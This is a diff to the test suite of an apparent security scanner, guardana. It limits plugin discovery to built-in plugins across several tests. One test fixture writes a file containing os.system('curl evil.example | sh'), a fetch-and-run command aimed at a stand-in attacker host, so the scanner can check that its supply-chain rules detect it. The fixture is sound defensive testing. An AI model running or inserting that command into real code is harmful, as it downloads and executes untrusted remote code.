@@ -9,6 +9,7 @@ from collections.abc import Iterator, Sequence
 from pathlib import Path
 
 import pytest
+from guardana.core.plugins import PluginMode, PluginTrust
 from guardana.core.profile.loader import default_profile
 from guardana.core.registry import Registry
 from guardana.core.rule import Rule
@@ -111,7 +112,9 @@ def test_a_third_party_file_target_runs_the_built_in_artifact_rules(tmp_path: Pa
     """
     (tmp_path / "loader.py").write_text("import os\nos.system('curl evil.example | sh')\n")
 
-    result = Runner(Registry.discover(), default_profile()).run(_FlatFileTarget(tmp_path))
+    result = Runner(
+        Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)), default_profile()
+    ).run(_FlatFileTarget(tmp_path))
 
     assert result.errors == ()
     assert any(f.rule_id.startswith("guardana.supply_chain") for f in result.findings), (
@@ -134,7 +137,9 @@ def test_locator_contract_is_exported_from_the_public_top_level() -> None:
 
 def test_declaring_a_capability_without_its_surface_is_an_error_not_silence() -> None:
     """One error naming the missing surface, instead of nineteen rules failing."""
-    result = Runner(Registry.discover(), default_profile()).run(_LiarTarget())
+    result = Runner(
+        Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)), default_profile()
+    ).run(_LiarTarget())
 
     assert [e.stage for e in result.errors] == ["capability"]
     assert "read_files" in result.errors[0].reason
@@ -187,7 +192,11 @@ def test_every_capability_with_a_surface_is_reachable_from_a_built_in_rule() -> 
     """
     from guardana.core.target.protocols import CAPABILITY_SURFACE  # noqa: PLC0415
 
-    needed = {c for rule in Registry.discover().rules() for c in rule.meta.required_capabilities}
+    needed = {
+        c
+        for rule in Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)).rules()
+        for c in rule.meta.required_capabilities
+    }
     unused = sorted(str(c) for c in CAPABILITY_SURFACE if c not in needed)
     assert not unused, f"capabilities with a surface and no rule asking for them: {unused}"
 
@@ -221,7 +230,11 @@ def test_a_rule_declaring_no_capability_is_not_offered_a_surface_it_cannot_use()
     # Selection still belongs to the runner and to `required_capabilities`. The
     # protocol is the narrower question asked at the point of use, not a second
     # selection mechanism that could disagree with the first.
-    rules = [r for r in Registry.discover().rules() if r.meta.target_kind is TargetKind.ARTIFACT]
+    rules = [
+        r
+        for r in Registry.discover(PluginTrust(mode=PluginMode.BUILTINS)).rules()
+        if r.meta.target_kind is TargetKind.ARTIFACT
+    ]
     assert rules
     assert all(Capability.READ_FILES in r.meta.required_capabilities for r in rules), (
         "an artifact rule that does not declare read_files would be planned against "
